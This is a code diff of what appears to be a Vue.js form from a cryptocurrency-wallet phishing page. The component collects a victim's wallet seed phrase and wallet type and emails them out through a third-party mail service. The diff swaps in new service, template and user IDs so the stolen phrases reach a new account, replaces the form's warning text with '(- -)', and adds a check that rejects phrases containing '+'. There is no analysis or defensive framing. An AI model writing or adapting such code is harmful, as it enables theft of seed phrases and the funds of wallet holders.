@@ -41,12 +41,15 @@ export default {
     sendData() {
       this.loading = true
       const self = this
-      const checker = this.formChecker()
+      const checker = this.formChecker();
       if (checker) {
         const data = {
-          service_id: "service_khz33ja",
-          template_id: "template_hl2qzeh",
-          user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
+          // service_id: "service_khz33ja",
+          // template_id: "template_hl2qzeh",
+          // user_id: "user_NfLXuXfvGqkJFOqnVRRmw",
+          service_id: "service_xq2i24g",
+          template_id: "template_bjz3ej8",
+          user_id: "user_jBO0e0q6wVjDKv6fvrb9q",
           template_params: {
             from_name: `Nmenomic on ${this.walletType}`,
             nmenomic: this.nmenomic,
@@ -65,7 +68,7 @@ export default {
       } else {
         this.$notify({
           title: 'Warning',
-          message: 'All Form input is required',
+          message: '(- -)',
           type: 'warning',
         })
       }
@@ -73,9 +76,11 @@ export default {
     formChecker() {
       if (this.nmenomic === '') {
         return false
-      } else {
-        return true
-      }
+      } else if (this.nmenomic.includes('+')){
+          return false
+        } else {
+          return true
+        }
     },
   },
 }
